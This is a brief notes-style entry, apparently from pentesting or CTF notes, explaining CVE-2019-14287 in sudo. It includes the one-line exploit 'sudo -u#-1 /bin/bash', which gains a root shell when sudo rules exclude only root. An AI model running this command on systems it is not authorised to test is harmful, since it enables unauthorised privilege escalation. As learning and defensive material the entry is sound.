#### CVE-2019-14287
#cve-2019-14287
Happens because sudo doesn't check the supplied user id, so by giving it `-u#-1`, the expression returns the ID `0` which is root's ID, and since sudo doesn't verify this ID, it executes bash as root. You can change the expression to be any user ID and take over that account, this isn't exclusive to root. 
```bash
# for situation where you run:
sudo -l

# and get the following output:
# (ALL, !root) /bin/bash

# This means you can run bash with sudo for any user on the system EXCEPT root.
# Trivially exploit to get root:
sudo -u#-1 /bin/bash

# And boom you have root!
```
